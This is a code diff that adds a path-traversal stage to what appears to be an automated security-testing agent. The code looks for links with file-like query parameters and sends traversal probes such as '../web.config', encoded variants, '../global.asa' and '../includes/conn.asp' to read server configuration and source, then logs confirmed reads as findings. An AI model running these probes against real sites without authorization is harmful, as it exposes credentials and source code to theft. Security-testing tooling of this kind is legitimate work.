@@ -16,10 +16,40 @@ import threading
 import time
 from collections import Counter
 from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urlsplit
+from urllib.parse import parse_qsl, quote, urlencode, urlunsplit, urlsplit
 
 from .agent_runtime import LocalPlane
 from .events import Event
+
+LFI_PARAMS = {"file", "filename", "path", "download", "template", "page",
+              "doc", "document", "folder", "load", "read"}
+
+
+def _lfi_template(inventory: dict) -> str:
+    """Find a link whose query carries a file-like parameter."""
+    for link in inventory.get("links") or []:
+        try:
+            parts = urlsplit(str(link))
+        except ValueError:
+            continue
+        if not parts.query:
+            continue
+        try:
+            pairs = parse_qsl(parts.query, keep_blank_values=True)
+        except ValueError:
+            continue
+        for name, _value in pairs:
+            if str(name).lower() not in LFI_PARAMS:
+                continue
+            rendered = []
+            for key, value in pairs:
+                if key == name:
+                    rendered.append(f"{quote(str(key))}={{{{path}}}}")
+                else:
+                    rendered.append(f"{quote(str(key))}={quote(str(value), safe='')}")
+            return urlunsplit((parts.scheme, parts.netloc, parts.path,
+                               "&".join(rendered), ""))
+    return ""
 
 
 class HuntRunner:
@@ -249,6 +279,47 @@ class HuntRunner:
                     signals.extend(["auth", "ato", "session"])
         except RuntimeError:
             workflow_inventory = {}
+        lfi_template = _lfi_template(workflow_inventory)
+        if lfi_template:
+            emit(Event(type="log", agent="hunt", stage="lfi",
+                       payload={"text": f"file-read candidate: {lfi_template}"}))
+            try:
+                chain = self._call(registry, "chain_run", {
+                    "read_url": lfi_template, "mission_id": mission_id,
+                    "probe_paths": ["web.config", "../web.config",
+                                    "..%2fweb.config", "..%5cweb.config",
+                                    "../../web.config"],
+                    "source_paths": ["../web.config", "../HQ/check.asp",
+                                     "../index.asp", "../global.asa",
+                                     "../includes/conn.asp"],
+                })
+                if chain.get("traversal", {}).get("read_confirmed"):
+                    title = (f"Path traversal on {host}: file parameter reads "
+                             "application source or config")
+                    existing, _ = self.server.index.list_hypotheses(
+                        mission_id, q=title, limit=1)
+                    if not existing:
+                        self._call(registry, "hypothesis_create", {
+                            "title": title,
+                            "target": lfi_template.replace("{{path}}", "../web.config"),
+                            "mission_id": mission_id,
+                            "technique": "path-traversal",
+                            "rationale": ("The surface inventory exposed a file-like "
+                                          "parameter; bounded traversal probes returned "
+                                          "source or config instead of the not-found page."),
+                            "expected": ("A 200 response whose body is server source, "
+                                         "configuration, or a file outside the intended "
+                                         "download set."),
+                        })
+                    emit(Event(type="log", agent="hunt", stage="lfi",
+                               payload={"text": (
+                                   f"file-read confirmed (depth "
+                                   f"{chain['traversal'].get('depth')}); "
+                                   f"chain: {chain.get('summary', {}).get('verdict')}")}))
+            except RuntimeError as exc:
+                emit(Event(type="log", agent="hunt", stage="lfi",
+                           payload={"text": f"file-read probe skipped: {exc}"}))
+
         # Enrich signals from the evidence graph so continuous hunts rotate
         # through auth, API, and tech-specific angles instead of two staples.
         graph_paths: list[str] = []
